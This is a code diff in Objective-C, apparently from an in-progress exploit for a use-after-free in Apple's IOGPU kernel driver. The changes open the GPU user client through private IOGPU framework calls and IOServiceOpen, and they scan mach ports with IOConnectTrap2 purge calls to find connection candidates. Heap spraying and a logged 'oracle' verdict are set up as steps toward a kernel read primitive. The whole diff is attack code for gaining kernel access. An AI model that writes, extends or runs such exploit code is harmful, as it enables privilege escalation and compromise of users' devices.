@@ -21,7 +21,7 @@
 #import <string.h>
 #import <unistd.h>
 
-#define P065_BUILD @"p065-facet-a-oracle-v1"
+#define P065_BUILD @"p065-facet-a-oracle-v2"
 #define P065_SEL_PURGE 3
 #define P065_UAF_KR ((kern_return_t)0xe00002be)
 #define P065_SPRAY_N 0x300
@@ -37,6 +37,11 @@ static volatile int g_armed;
 static sigjmp_buf g_jmp;
 static IOConnectTrap2_t g_trap2;
 static IOSurfaceCreate_t g_iosCreate;
+static id<MTLBuffer> g_seedBuf;
+static id g_seedTex;
+
+typedef void *(*p065_DevCreate_t)(io_service_t);
+typedef mach_port_t (*p065_GetConn_t)(void *);
 
 static void p065_log(NSString *fmt, ...) {
     va_list ap;
@@ -68,23 +73,88 @@ static void p065_sigabort(int sig, siginfo_t *info, void *vctx) {
 }
 @end
 
-static NSArray<NSNumber *> *p065_conns(void) {
+static id<MTLTexture> p065_tex(id<MTLDevice> dev, uint32_t w, uint32_t h);
+
+/* Empty IOGPU resource table answers Trap2 sel=3 id=1 with 0xe00002c2.
+ * That IS the GPU user client. Reject only invalid-dest / fail / unsupported. */
+static BOOL p065_trap2_reject(kern_return_t kr) {
+    return kr == (kern_return_t)0x10000003
+        || kr == KERN_FAILURE
+        || kr == (kern_return_t)0xe00002c7;
+}
+
+static void p065_add_port(NSMutableArray *conns, NSMutableSet *seen,
+                          mach_port_name_t p, kern_return_t kr, NSString *how) {
+    if (p < 0x100) return;
+    NSNumber *key = @(p);
+    if ([seen containsObject:key]) return;
+    [seen addObject:key];
+    [conns addObject:key];
+    p065_log(@"[conn] port=0x%x sel3 kr=0x%x via %@", (unsigned)p, (unsigned)kr, how);
+}
+
+static mach_port_t p065_open_iogpu_explicit(void) {
+    mach_port_t master = MACH_PORT_NULL;
+    mach_port_t *pMain = (mach_port_t *)dlsym(RTLD_DEFAULT, "kIOMainPortDefault");
+    if (!pMain) pMain = (mach_port_t *)dlsym(RTLD_DEFAULT, "kIOMasterPortDefault");
+    if (pMain) master = *pMain;
+
+    io_service_t svc = IOServiceGetMatchingService(master, IOServiceMatching("IOGPU"));
+    if (!svc) svc = IOServiceGetMatchingService(master, IOServiceMatching("IOGPUDevice"));
+    if (!svc) {
+        p065_log(@"[conn] IOGPU service miss");
+        return MACH_PORT_NULL;
+    }
+    void *h = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
+    if (!h) h = dlopen("/System/Library/Frameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
+    p065_DevCreate_t create = h ? (p065_DevCreate_t)dlsym(h, "IOGPUDeviceCreate") : NULL;
+    p065_GetConn_t getc = h ? (p065_GetConn_t)dlsym(h, "IOGPUDeviceGetConnect") : NULL;
+    mach_port_t conn = MACH_PORT_NULL;
+    if (create && getc) {
+        void *dev = create(svc);
+        p065_log(@"[conn] IOGPUDeviceCreate -> %p", dev);
+        if (dev) conn = getc(dev);
+    }
+    if (conn == MACH_PORT_NULL) {
+        kern_return_t okr = IOServiceOpen(svc, mach_task_self(), 1, &conn);
+        p065_log(@"[conn] IOServiceOpen(type=1) kr=0x%x conn=0x%x",
+                 (unsigned)okr, (unsigned)conn);
+        if (okr != KERN_SUCCESS) conn = MACH_PORT_NULL;
+    }
+    IOObjectRelease(svc);
+    return conn;
+}
+
+static NSArray<NSNumber *> *p065_conns(id<MTLDevice> dev) {
     NSMutableArray *conns = [NSMutableArray array];
+    NSMutableSet *seen = [NSMutableSet set];
+
+    g_seedBuf = [dev newBufferWithLength:0x1000 options:MTLResourceStorageModeShared];
+    p065_log(@"[conn] seed MTLBuffer %@", g_seedBuf ? @"OK" : @"NIL");
+    g_seedTex = p065_tex(dev, 8, 8);
+    p065_log(@"[conn] seed 8x8 tex %@", g_seedTex ? @"OK" : @"NIL");
+
+    mach_port_t explicitConn = p065_open_iogpu_explicit();
+    if (explicitConn) {
+        kern_return_t kr = g_trap2((io_connect_t)explicitConn, P065_SEL_PURGE, 1, 0);
+        p065_add_port(conns, seen, explicitConn, kr, @"IOGPUDeviceCreate");
+    }
+
     mach_port_name_array_t names = NULL;
     mach_msg_type_number_t nn = 0;
     mach_port_type_array_t types = NULL;
     mach_msg_type_number_t nt = 0;
-    if (mach_port_names(mach_task_self(), &names, &nn, &types, &nt) != KERN_SUCCESS)
+    if (mach_port_names(mach_task_self(), &names, &nn, &types, &nt) != KERN_SUCCESS) {
+        p065_log(@"[conn] %u candidates (port-scan failed)", (unsigned)conns.count);
         return conns;
+    }
     for (mach_msg_type_number_t i = 0; i < nn; i++) {
         if (!(types[i] & MACH_PORT_TYPE_SEND)) continue;
         mach_port_name_t p = names[i];
-        if (p < 0x100 || p > 0xFFFF) continue;
+        if (p < 0x100 || p > 0x40000) continue;
         kern_return_t kr = g_trap2((io_connect_t)p, P065_SEL_PURGE, 1, 0);
-        if (kr != (kern_return_t)0xe00002c2 && kr != (kern_return_t)0xe00002c7) {
-            p065_log(@"[conn] port=0x%x sel3 kr=0x%x", (unsigned)p, (unsigned)kr);
-            [conns addObject:@(p)];
-        }
+        if (p065_trap2_reject(kr)) continue;
+        p065_add_port(conns, seen, p, kr, @"port-scan");
     }
     if (names && nn) vm_deallocate(mach_task_self(), (vm_address_t)names, nn * sizeof(mach_port_name_t));
     if (types && nt) vm_deallocate(mach_task_self(), (vm_address_t)types, nt * sizeof(mach_port_type_t));
@@ -127,6 +197,8 @@ static id<MTLTexture> p065_tex(id<MTLDevice> dev, uint32_t w, uint32_t h) {
 
 + (NSString *)tap {
     g_log = [NSMutableString string];
+    g_seedBuf = nil;
+    g_seedTex = nil;
     NSString *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
     NSString *path = [docs stringByAppendingPathComponent:@"p065_facet_a_log.txt"];
     g_fd = open(path.UTF8String, O_CREAT | O_WRONLY | O_TRUNC, 0644);
@@ -165,9 +237,9 @@ static id<MTLTexture> p065_tex(id<MTLDevice> dev, uint32_t w, uint32_t h) {
     }
     p065_log(@"Metal %@", dev.name);
 
-    NSArray<NSNumber *> *conns = p065_conns();
+    NSArray<NSNumber *> *conns = p065_conns(dev);
     if (conns.count == 0) {
-        p065_log(@"[-] no GPU conn candidates");
+        p065_log(@"[-] no GPU conn candidates (seed+IOGPUDeviceCreate+port-scan all empty)");
         if (g_fd >= 0) { fcntl(g_fd, F_FULLFSYNC); close(g_fd); g_fd = -1; }
         NSString *ret = g_log; g_log = nil; return ret;
     }
@@ -257,6 +329,8 @@ static id<MTLTexture> p065_tex(id<MTLDevice> dev, uint32_t w, uint32_t h) {
     p065_log(@"=== VERDICT hits=%u ===", hits);
     p065_log(@"Facet A is an oracle. Shape-1 kernel MD reclaim still required for kread.");
     p065_log(@"hasKread stays NO.");
+    g_seedBuf = nil;
+    g_seedTex = nil;
     if (g_fd >= 0) { fcntl(g_fd, F_FULLFSYNC); close(g_fd); g_fd = -1; }
     NSString *ret = g_log;
     g_log = nil;
